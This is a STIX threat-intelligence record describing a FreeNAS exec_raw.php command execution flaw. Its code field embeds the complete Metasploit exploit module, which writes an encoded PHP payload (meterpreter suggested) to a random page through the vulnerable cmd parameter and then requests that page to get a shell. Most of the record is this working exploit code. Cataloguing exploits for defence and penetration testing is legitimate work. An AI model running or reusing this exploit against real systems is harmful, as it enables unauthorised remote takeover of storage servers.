{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--8660f5ee-55f2-4841-a445-e14ea8810608",
    "created": "2024-08-14T17:11:36.03755Z",
    "modified": "2024-08-14T17:11:36.037553Z",
    "name": "FreeNAS exec_raw.php Arbitrary Command Execution",
    "description": " This module exploits an arbitrary command execution flaw",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/freenas_exec_raw.rb",
            "external_id": "freenas_exec_raw.rb"
        },
        {
            "source_name": "reference",
            "url": "http://sourceforge.net/projects/freenas/files/stable/0.7.2/NOTES%200.7.2.5543.txt/download"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  include Msf::Exploit::Remote::HttpClient\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'FreeNAS exec_raw.php Arbitrary Command Execution',\n      'Description'    => %q{\n          This module exploits an arbitrary command execution flaw\n        in FreeNAS 0.7.2 < rev.5543. When passing a specially formatted URL\n        to the exec_raw.php page, an attacker may be able to execute arbitrary\n        commands.\n\n        NOTE: This module works best with php/meterpreter payloads.\n      },\n      'Author'         => [ 'MC' ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'OSVDB', '94441' ],\n          [ 'URL', 'http://sourceforge.net/projects/freenas/files/stable/0.7.2/NOTES%200.7.2.5543.txt/download' ]\n        ],\n      'Payload'\t=>\n        {\n          'Space'    => 6144,\n          'DisableNops' => true,\n          'BadChars'    => \"`\\\"' %&x\",\n        },\n      'Targets'\t=>\n        [\n          [ 'Automatic Target', { } ]\n        ],\n      'Privileged' => true,\n      'Platform' => 'php',\n      'Arch' => ARCH_PHP,\n      'DisclosureDate' => '2010-11-06',\n      'DefaultTarget' => 0))\n  end\n\n  def exploit\n\n    page = rand_text_alpha_upper(rand(5) + 1 ) + \".php\"\n\n    shellcode = payload.encoded\n\n    sploit = \"echo \\\"<?php\\n#{shellcode}\\n?>\\\" > #{page}\"\n\n    print_status(\"Sending exploit page '#{page}'\")\n\n    res = send_request_raw(\n      {\n        'uri'\t=> \"/exec_raw.php?cmd=\" + Rex::Text.uri_encode(sploit),\n      }, 10)\n\n    if (res and res.code == 200)\n      print_status(\"Triggering payload...\")\n      send_request_raw({ 'uri' => \"/#{page}\" }, 5)\n      handler\n    else\n      print_error(\"Exploit failed\")\n      return\n    end\n\n  end\nend\n",
    "x_mitre_contributors": [
        "[ MC ]",
        ""
    ],
    "x_mitre_disclosure_date": "2010-11-06",
    "x_mitre_platforms": [
        "php'"
    ]
}